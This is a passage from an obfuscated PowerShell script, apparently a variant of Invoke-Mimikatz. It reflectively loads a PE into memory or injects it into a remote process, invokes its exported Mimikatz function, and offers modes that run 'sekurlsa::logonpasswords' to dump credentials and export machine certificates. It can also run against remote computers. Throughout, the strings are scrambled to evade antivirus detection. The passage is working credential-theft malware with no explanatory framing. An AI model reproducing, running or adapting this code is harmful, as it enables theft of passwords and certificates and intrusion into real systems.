
				${I`Mpo`RT`DL`lpath} =   (VariaBlE  ("JK5MB"+"H") -VALUeOnLY)::("{3}{0}{2}{1}" -f 'ToS','ingAnsi','tr','Ptr').Invoke((&("{1}{2}{0}{4}{3}"-f'U','Add-Signed','IntAs','signed','n') ([Int64]${PEin`Fo}."pEHA`Nd`le") ([Int64]${I`mPOR`Td`esCR`IPtor}."N`AmE")))
				${I`mPor`TDLLHAN`DLE} = ${win3`2`FUnCT`I`onS}."geTMo`dU`L`ehaNdLE"."i`Nvoke"(${i`mP`o`RtDLLPATh})

				if (${imPO`RT`Dll`HA`NDLE} -eq ${n`UlL})
				{
					&("{2}{1}{3}{0}" -f '-Warning','r','W','ite') ('Err'+'or '+'ge'+'tti'+'ng '+'DL'+'L '+'ha'+'nd'+'le '+'in'+' '+'M'+'e'+'moryF'+'re'+'eLi'+'brary, '+'DLLN'+'ame:'+' '+"$ImportDllPath. "+'C'+'on'+'tin'+'uing '+'any'+'wa'+'ys') -WarningAction ("{0}{2}{1}" -f 'Cont','e','inu')
				}
				
				${S`U`ccesS} = ${w`In32fU`N`Ct`iONs}."f`ReE`LIBra`Ry"."IN`VOKe"(${im`pORtdLlha`Nd`le})
				if (${Suc`c`esS} -eq ${F`Al`SE})
				{
					&("{0}{1}{2}"-f'Wri','te','-Warning') ('Unabl'+'e'+' '+'to'+' '+'free'+' '+'libra'+'ry: '+"$ImportDllPath. "+'Conti'+'n'+'uing'+' '+'a'+'nyw'+'ays.') -WarningAction ("{0}{1}{2}"-f'Cont','in','ue')
				}
				
				${ImPO`RTDE`sc`Ript`orP`Tr} = &("{0}{1}{4}{2}{3}"-f 'Ad','d-Sig','s','igned','nedIntAsUn') (${impO`RTDe`S`c`RiP`TORptR}) ( ${jK5`mBH}::"SIze`oF"([Type]${WI`N32t`YPes}."i`mAGe_i`MPO`RT_`dESCr`iPT`oR"))
			}
		}
		
		&("{0}{2}{3}{4}{1}" -f'Wr','erbose','it','e','-V') ("{12}{1}{11}{4}{9}{8}{7}{10}{2}{0}{3}{6}{5}{13}"-f 'it is bein','l','ows ','g ','in so','a','unlo','DL','he ',' t','L kn','ling dllma','Ca','ded')
		${dllMai`Np`TR} = &("{2}{0}{3}{4}{1}"-f 'dd-Sig','AsUnsigned','A','nedI','nt') (${p`E`infO}."pe`H`ANDLE") (${P`eiNFo}."imAG`E`_n`T_`Headers"."Op`T`I`Ona`lhEaDeR"."aD`dr`ESsof`EnTrYpOinT")
		${D`ll`MAINDe`LeGAte} = &("{3}{4}{1}{0}{2}"-f'a','eleg','teType','Get-','D') @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		${D`l`lMAIn} =  ( ls  ('vAri'+'ablE:J'+'K5'+'M'+'bh')  )."vA`LuE"::("{6}{1}{5}{4}{3}{2}{0}{7}" -f'ctionP','etDe','n','ForFu','e','legat','G','ointer').Invoke(${DL`l`M`AINPTR}, ${dLLMAIn`deLeGa`Te})
		
		${DLL`mA`In}."InV`oKE"(${PEi`Nfo}."P`eHaND`le", 0,   (gCi ("{1}{3}{4}{2}{0}"-f'7D','V','bLe:jp','ar','ia'))."Val`Ue"::"z`eRo") | &("{0}{2}{1}" -f 'Out','ll','-Nu')
		
		
		${S`UcCe`sS} = ${WI`N`32FuN`Ctio`NS}."Vir`Tu`ALfREe"."i`NVoKe"(${pEh`AnD`LE}, [UInt64]0, ${WIN32CoNSTa`N`TS}."me`M_`Re`LeasE")
		if (${S`UCC`EsS} -eq ${F`AL`Se})
		{
			&("{3}{0}{1}{2}" -f 'e-Warn','in','g','Writ') ((("{10}{16}{3}{4}{1}{0}{7}{15}{9}{2}{14}{17}{8}{13}{11}{12}{6}{5}"-f'all Vi','to c','Fr','ble',' ','ways.','ny','r','memor','l','U',' Conti','nuing a','y.','ee on t','tua','na','he PEA3Ss '))  -cREPlaCE  ([CHaR]65+[CHaR]51+[CHaR]83),[CHaR]39) -WarningAction ("{2}{1}{0}"-f'e','inu','Cont')
		}
	}


	Function M`AIn
	{
		${WIn32FUNC`T`ioNS} = &("{4}{3}{1}{0}{2}" -f'unctio','2F','ns','Win3','Get-')
		${Wi`N3`2TYPes} = &("{0}{1}{2}"-f'G','et-Win','32Types')
		${wIn32`CONS`TAN`Ts} =  &("{2}{5}{4}{0}{3}{1}"-f'Consta','s','Get-','nt','in32','W')
		
		${REM`O`Te`p`Ro`ChAndlE} =   ${JP`7D}::"Z`ErO"
	
		if ((${Pr`OC`ID} -ne ${n`ULl}) -and (${pr`OCID} -ne 0) -and (${PR`oCnaMe} -ne ${N`ULl}) -and (${PRoc`NA`me} -ne ""))
		{
			Throw ((("{9}{5}{8}{4}{7}{10}{6}{2}{1}{0}{11}{3}" -f 'e on','os','o','her','ProcId and','BDt ',', ch',' Pr','supply a ','Cank','ocName','e or the ot'))."Rep`lAcE"(([char]107+[char]66+[char]68),[STrInG][char]39))
		}
		elseif (${p`R`ocNAmE} -ne ${n`Ull} -and ${pR`oCna`Me} -ne "")
		{
			${PR`OCEss`ES} = @(&("{1}{0}{2}{3}" -f 'e','G','t-P','rocess') -Name ${P`ROCnA`Me} -ErrorAction ("{4}{3}{2}{1}{0}"-f 'ue','tin','n','lentlyCo','Si'))
			if (${pR`OCEs`sEs}."Co`UNt" -eq 0)
			{
				Throw ((('Can'+'bxPt'+' ') -rEplAce([char]98+[char]120+[char]80),[char]39)+'fi'+'nd '+'proc'+'ess '+"$ProcName")
			}
			elseif (${PRoc`ES`ses}."cOU`NT" -gt 1)
			{
				${pROC`In`Fo} = &("{1}{0}{2}" -f 'es','Get-Proc','s') | &("{1}{0}" -f 'ere','wh') { ${_}."nA`ME" -eq ${pRo`CnaMe} } | &("{2}{1}{0}" -f'ect','j','Select-Ob') ("{1}{0}{2}{3}"-f'ss','Proce','Nam','e'), ('Id'), ("{1}{0}{2}"-f'I','Session','d')
				&("{0}{1}{3}{2}"-f'W','ri','-Output','te') ${pR`o`cInfO}
				Throw ('Mo'+'re '+'th'+'an '+'on'+'e '+'instanc'+'e'+' '+'of'+' '+"$ProcName "+'fou'+'nd,'+' '+'plea'+'s'+'e '+'s'+'peci'+'fy '+'t'+'he '+'process'+' '+'I'+'D '+'t'+'o '+'injec'+'t'+' '+'in'+' '+'to'+'.')
			}
			else
			{
				${Pro`CiD} = ${pRoC`e`Ss`eS}[0]."id"
			}
		}
		
		
		if ((${P`RO`CID} -ne ${n`UlL}) -and (${P`RO`CiD} -ne 0))
		{
			${r`eM`otep`R`ocH`AnDle} = ${WIn32`FUnct`IO`Ns}."OpEnPR`OC`eSS"."i`N`VOKe"(0x001F0FFF, ${F`Al`Se}, ${P`RO`cID})
			if (${reMOtE`Pro`ChAN`dLE} -eq  (vARIAbLE  ("{0}{1}" -f 'jP','7d')  )."V`Alue"::"ZE`Ro")
			{
				Throw (('Cou'+'l'+'dn{'+'0}t ')  -F[ChAR]39+'o'+'btai'+'n '+'t'+'he '+'hand'+'le '+'f'+'or '+'proce'+'s'+'s '+'ID'+': '+"$ProcId")
			}
			
			&("{0}{2}{1}" -f 'W','se','rite-Verbo') ("{1}{3}{9}{2}{5}{6}{10}{0}{11}{4}{8}{7}"-f 'inj','Got','ndle for the remote p',' th',' in','ro','ces','to',' ','e ha','s to ','ect')
		}
		

		&("{1}{2}{3}{0}"-f 'ose','Write','-','Verb') ("{4}{6}{5}{7}{1}{2}{0}{3}"-f'r','br','a','y','Calling I','voke-MemoryLo','n','adLi')

        try
        {
            ${P`Roces`SORS} = &("{2}{0}{1}"-f 'et','-WmiObject','G') -Class ("{1}{0}{2}" -f '_Proces','Win32','sor')
        }
        catch
        {
            throw (${_}."eXc`ePt`iON")
        }

        if (${p`ROcESSO`Rs} -is [array])
        {
            ${pRo`CesS`oR} = ${p`ROcEsso`RS}[0]
        } else {
            ${pROc`Es`s`oR} = ${pro`cEss`oRs}
        }

        if ( ( ${PR`o`C`essor}."A`DdrEs`SWiDth") -ne ((  (  Ls  ("{2}{1}{0}" -f'le:anF6','RiAb','vA') )."vAL`UE"::"S`Ize")*8) )
        {
            &("{0}{2}{1}"-f 'Write-Ve','se','rbo') ( ("{3}{0}{4}{2}{1}"-f'rchite',' ','ure:','A','ct') + ${PRo`C`ES`sOr}."Ad`dr`es`sWIDth" + ("{2}{0}{1}{3}"-f'rocess',':',' P',' ') + ( (  ls ("v"+"arIabLe:"+"anf6") )."Va`LUe"::"S`IZE" * 8))
            &("{1}{3}{0}{2}"-f 'rr','Write-','or','E') ((("{18}{5}{2}{8}{9}{13}{4}{12}{19}{0}{6}{15}{11}{1}{7}{20}{16}{17}{3}{14}{10}" -f '4bit) doesnBKy','h OS ','rSh','used o','b','we','t ','arch','ell a','rchit','S.','tc','i','ecture (32','n a 64bit O','ma','64bit PS ','must be ','Po','t/6','itecture. '))  -rEplACe  ([cHar]66+[cHar]75+[cHar]121),[cHar]39) -ErrorAction ("{0}{1}"-f 'S','top')
        }

        if (  ${jK5`M`Bh}::"sI`ZE`of"([Type][IntPtr]) -eq 8)
        {
            [Byte[]]${p`EbYteS} = [Byte[]] (  chILdItem ("{0}{2}{1}{3}"-f 'vARIABl','5S','E:41','Ne'))."v`ALUe"::("{1}{0}{2}"-f'64S','FromBase','tring').Invoke(${peby`Te`s64})
        }
        else
        {
            [Byte[]]${P`eBy`TEs} = [Byte[]]  ( gI ('v'+'a'+'riaBLE:4'+'1'+'5snE'))."Va`Lue"::("{0}{3}{2}{1}"-f 'FromB','ng','4Stri','ase6').Invoke(${p`EByTES`32})
        }
        ${pe`By`Tes}[0] = 0
        ${peByT`ES}[1] = 0
		${PE`hAnd`Le} =  (  chIldITem ("{2}{0}{1}" -f'rI','Able:JP7D','vA')  )."val`UE"::"ze`RO"
		if (${rE`MOtE`pRoCh`An`D`LE} -eq   (Ls  ("{0}{2}{1}{3}" -f 'vaR','blE:','iA','Jp7d') )."Val`Ue"::"Ze`RO")
		{
			${p`E`LoA`deDInFo} = &("{2}{6}{0}{5}{3}{1}{4}"-f'voke-Memo','L','I','d','ibrary','ryLoa','n') -PEBytes ${P`EbyTEs} -ExeArgs ${eXE`A`RgS}
		}
		else
		{
			${Pe`Loa`De`D`INFO} = &("{1}{2}{0}{5}{3}{4}{6}"-f 'vo','I','n','moryLoad','L','ke-Me','ibrary') -PEBytes ${P`EBYtes} -ExeArgs ${e`x`EARgS} -RemoteProcHandle ${rem`O`TEPRO`Cha`NdLe}
		}
		if (${p`Eloa`D`edINfO} -eq  (  lS ("{3}{2}{0}{1}"-f 'E',':jP7D','rIAbL','VA') )."VaL`Ue"::"Z`ErO")
		{
			Throw ("{11}{8}{6}{9}{4}{3}{2}{0}{10}{7}{1}{5}{12}" -f't','ed ','le re','d PE, hand','o loa','is ','ble ','rn','na','t','u','U','NULL')
		}
		
		${peH`A`NDLE} = ${PELoAd`Ed`info}[0]
		${REMOtep`e`H`AndlE} = ${pe`Lo`A`deDi`NFo}[1] 
		
		
		${peiN`FO} = &("{1}{3}{0}{2}{4}" -f 'etai','Get-','l','PED','edInfo') -PEHandle ${P`e`hAND`Le} -Win32Types ${WiN3`2T`YPeS} -Win32Constants ${w`I`N3`2CONSt`ANTS}
		if ((${peI`Nfo}."FILE`TyPE" -ieq "DLL") -and (${remOt`EpROCha`N`D`LE} -eq  ${J`p7D}::"Ze`Ro"))
		{
                    &("{0}{4}{3}{2}{1}"-f'Wr','e','os','te-Verb','i') ("{1}{10}{0}{8}{5}{3}{9}{4}{2}{6}{7}"-f 'h WStri','Calling ','y','r',' t','retu','p','e','ng ','n','function wit')
				    [IntPtr]${w`s`TRinGF`UN`Cad`dr} = &("{3}{4}{0}{1}{2}"-f'oc','A','ddress','Get','-MemoryPr') -PEHandle ${Pe`h`ANDLE} -FunctionName ("{5}{4}{3}{6}{7}{1}{0}{2}" -f'e','tiv','_kitty','hell_re','s','power','fl','ec')
				    if (${Ws`TrINgfUn`C`Ad`Dr} -eq  ${j`p7d}::"zE`RO")
				    {
					    Throw ((("{5}{8}{4}{1}{2}{0}{6}{7}{3}" -f'd','c','tion a','.','find fun','Couldn','dr','ess','K7dt '))."rEPLA`ce"('K7d',[STrINg][char]39))
				    }
				    ${WST`R`IngFUn`CdelE`G`A`Te} = &("{3}{4}{2}{0}{1}"-f'ate','Type','eg','Get-','Del') @([IntPtr]) ([IntPtr])
				    ${w`s`TriNGf`Unc} =   ${J`k5M`BH}::("{0}{2}{4}{5}{3}{1}"-f'GetDe','ter','legateF','Poin','orFuncti','on').Invoke(${WST`Ri`N`G`FuNCaddr}, ${WST`RingfUNcDEL`e`gaTe})
                    ${w`st`R`i`NGinpUT} =  ( gI ("{0}{2}{1}{3}" -f'v','IaBLe:J','ar','k5mbH'))."VAL`Ue"::("{1}{0}{2}{3}" -f 'gToHGlobalU','Strin','n','i').Invoke(${E`XEAr`gs})
				    [IntPtr]${oUtpu`T`PTR} = ${Ws`T`Ri`NgfUNc}."In`Vo`Ke"(${wSTRin`G`IN`p`UT})
                      ( Item  ("var"+"iaBlE:"+"j"+"K5M"+"BH"))."vaL`UE"::("{0}{2}{1}"-f'Free','lobal','HG').Invoke(${w`strIng`I`NPUT})
				    if (${O`UTpUTP`Tr} -eq   (ItEM ("{3}{1}{2}{0}" -f ':jP7D','aRiA','BLe','V'))."va`LuE"::"Z`ERO")
				    {
				    	Throw ("{4}{10}{3}{9}{8}{6}{7}{1}{0}{5}{2}" -f'ut, Output Pt','tp','is NULL','l','U','r ','o','u',' to get ','e','nab')
				    }
				    else
				    {
				        ${Out`PuT} =   (  GeT-CHILDItEM  ("{2}{1}{4}{0}{3}" -f '5m','iABLe:j','Var','BH','K')  )."VA`LuE"::("{3}{0}{2}{1}"-f 'S','ngUni','tri','PtrTo').Invoke(${OUt`put`PTR})
				        &("{0}{2}{1}" -f'Write','tput','-Ou') ${ou`TPUt}
				        ${WI`N32fUN`CT`io`Ns}."LocaL`F`ReE"."i`NVokE"(${O`UtPU`TPTr});
				    }
		}
		elseif ((${p`eiNFo}."f`ileT`ype" -ieq "DLL") -and (${reMO`TEPR`oCh`A`NDle} -ne   ( get-VAriaBLE  ("jP"+"7d")  )."V`ALuE"::"ZE`RO"))
		{
			${v`OID`FuncAddR} = &("{2}{0}{3}{1}" -f'ryP','s','Get-Memo','rocAddres') -PEHandle ${P`eHand`le} -FunctionName ("{1}{0}" -f 'nc','VoidFu')
			if ((${voiD`F`UNCa`ddR} -eq ${n`UlL}) -or (${VOi`dFunCa`D`DR} -eq   ${Jp`7d}::"ZE`Ro"))
			{
				Throw ((("{3}{7}{2}{9}{4}{5}{1}{6}{8}{11}{0}{10}" -f 'L',' ','o','V','dn{0','}t','be found in ','oidFunc c','the','ul','L',' D'))-f [ChAr]39)
			}
			
			${vO`i`dFun`CAddR} = &("{3}{1}{6}{0}{5}{4}{2}" -f'As','b-Si','igned','Su','s','Un','gnedInt') ${vOid`Fun`CAddR} ${PeH`An`dLe}
			${voIdFU`N`caD`dR} = &("{4}{6}{2}{5}{1}{3}{0}" -f 'd','tAsU','-Sig','nsigne','A','nedIn','dd') ${voi`DfU`NcAD`Dr} ${REMOtEp`eh`ANDLe}
			
			${R`ThrE`Adhan`dLE} = &("{3}{4}{5}{2}{1}{6}{0}" -f'read','e','Remot','Inv','oke-Creat','e','Th') -ProcessHandle ${ReMo`TEPR`OCH`AN`Dle} -StartAddress ${vo`IdFun`Ca`Ddr} -Win32Functions ${Win`3`2FuNcT`IoNs}
		}
		
		if (${r`E`mo`TEprOcHANDle} -eq  ( GeT-vaRIaBle  ("{1}{0}" -f'p7D','j')  -vAlUEoN)::"Ze`RO")
		{
			&("{1}{2}{3}{0}{4}" -f 'a','Invo','ke-MemoryFre','eLibr','ry') -PEHandle ${p`E`HANdlE}
		}
		else
		{
			${SUc`C`ESS} = ${w`in32funCT`IoNs}."v`I`RTuAlFreE"."iN`V`oke"(${PeHAN`Dle}, [UInt64]0, ${wIn32`Co`Ns`TaNTs}."mE`M_`Re`LeAse")
			if (${S`Uccess} -eq ${F`A`LSe})
			{
				&("{0}{2}{3}{4}{1}"-f'W','ing','ri','t','e-Warn') ((("{11}{17}{8}{10}{4}{0}{6}{12}{16}{9}{2}{14}{15}{13}{1}{3}{5}{7}" -f'he','n','ory.','y','n t','w',' ','ays.','e ',' mem','to call VirtualFree o','U','PET','g a',' Co','ntinuin','IHs','nabl'))."R`Epl`Ace"(([Char]84+[Char]73+[Char]72),[stRING][Char]39)) -WarningAction ("{0}{1}" -f'Con','tinue')
			}
		}
		
		&("{2}{4}{1}{0}{3}" -f 'rb','-Ve','W','ose','rite') ("{1}{0}"-f 'e!','Don')
	}

	&("{0}{1}"-f'M','ain')
}

Function mA`iN
{
	if ((${Psc`Md`leT}."mY`inv`ocATIoN"."BO`UNDpA`R`AmeT`ERS"[("{1}{0}"-f 'g','Debu')] -ne ${NU`LL}) -and ${ps`CMD`let}."m`Yinvo`cAtiON"."B`Oun`d`pARAMeTe`Rs"[("{1}{0}" -f'ebug','D')]."Is`P`ResENt")
	{
		${deBu`GPR`e`FErenCE}  = ("{0}{1}" -f'Continu','e')
	}
	
	&("{2}{4}{0}{3}{1}" -f'te-','e','Wr','Verbos','i') ('Po'+'werShell'+' '+'P'+'rocess'+'ID'+': '+"$PID")
	

	if (${Ps`Cm`DlET}.paRAMEtErSeTnAme -ieq ("{0}{2}{1}" -f'Du','s','mpCred'))
	{
		${EXE`ARgS} = ("{6}{5}{2}{1}{4}{0}{3}" -f 'ds e','npa','go','xit','sswor','sa::lo','sekurl')
	}
    elseif (${PS`c`mDlET}.PARAmETeRSetNaMe -ieq ("{2}{1}{0}" -f 'erts','pC','Dum'))
    {
        ${eXE`A`RgS} = ('c'+'ry'+'pto::cn'+'g '+'crypt'+'o'+'::c'+'api'+' '+"`"crypto::certificates "+"/export`" "+"`"crypto::certificates "+'/'+'exp'+'ort '+"/systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE`" "+'exi'+'t')
    }
    else
    {
        ${ex`eA`RGS} = ${CoM`mand}
    }

      (  geT-ChiLDITeM  ("{1}{2}{0}{3}"-f 'E:','Va','RiaBl','12XJ8k') )."VAl`Ue"::("{1}{4}{0}{3}{2}"-f 'Curre','S','irectory','ntD','et').Invoke(${p`wd})



	if (${c`o`M`PUTernamE} -eq ${n`ULL} -or ${Com`PU`T`ernaMe} -imatch "^\s*$")
	{
		&("{2}{1}{3}{0}"-f 'nd','n','I','voke-Comma') -ScriptBlock ${rEM`otESCr`I`ptBLOCK} -ArgumentList @(${pE`BY`T`Es64}, ${PE`B`y`TEs32}, ("{0}{1}"-f 'V','oid'), 0, "", ${EX`EARGs})
	}
	else
	{
		&("{3}{2}{1}{4}{0}" -f 'd','-','nvoke','I','Comman') -ScriptBlock ${R`eMOteSC`RiPtb`LOCk} -ArgumentList @(${PebyTe`S`64}, ${pE`BytE`S32}, ("{0}{1}"-f 'Voi','d'), 0, "", ${exear`Gs}) -ComputerName ${c`OmPUte`R`NaME}
	}
}

&("{0}{1}"-f 'M','ain')
}
